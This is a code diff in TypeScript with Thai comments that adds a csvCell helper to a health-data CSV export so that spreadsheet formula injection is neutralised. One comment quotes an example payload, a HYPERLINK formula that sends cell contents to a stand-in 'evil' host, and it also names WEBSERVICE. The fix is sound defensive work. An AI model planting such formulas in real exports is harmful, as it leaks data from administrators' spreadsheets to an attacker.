@@ -500,6 +500,17 @@ function escapeHtml(value: unknown): string {
   });
 }
 
+// กัน CSV formula injection (CWE-1236) — ไฟล์นี้ถูกเปิดใน Excel/Sheets ของผู้ดูแล
+// เซลล์ที่ขึ้นต้นด้วย = + - @ (หรือ tab/CR) จะถูกตีความเป็น "สูตร" ไม่ใช่ข้อความ
+// เช่น detail = `=HYPERLINK("http://evil/?"&A1,"คลิก")` หรือ `=WEBSERVICE(...)`
+// ⇒ การ escape เครื่องหมายคำพูดไม่ช่วยเลย ต้องเติม apostrophe ให้เป็นข้อความล้วน
+// (audit export ทำแบบนี้อยู่แล้วผ่าน csvCell ใน audit.routes.ts — health ตกหล่น)
+function csvCell(value: unknown): string {
+  let text = value === null || value === undefined ? '' : String(value);
+  if (/^[=+\-@\t\r]/.test(text)) text = `'${text}`;
+  return `"${text.replace(/"/g, '""')}"`;
+}
+
 // GET /api/health/export?format=csv|html&days=30
 router.get('/export', authenticate, async (req, res) => {
   try {
@@ -521,8 +532,8 @@ router.get('/export', authenticate, async (req, res) => {
           new Date(o.observed_at).toISOString(),
           o.category,
           o.severity,
-          `"${(o.source || '').replace(/"/g, '""')}"`,
-          `"${(o.detail || '').replace(/"/g, '""')}"`,
+          csvCell(o.source),
+          csvCell(o.detail),
         ].join(',')
       );
       res.setHeader('Content-Type', 'text/csv; charset=utf-8');
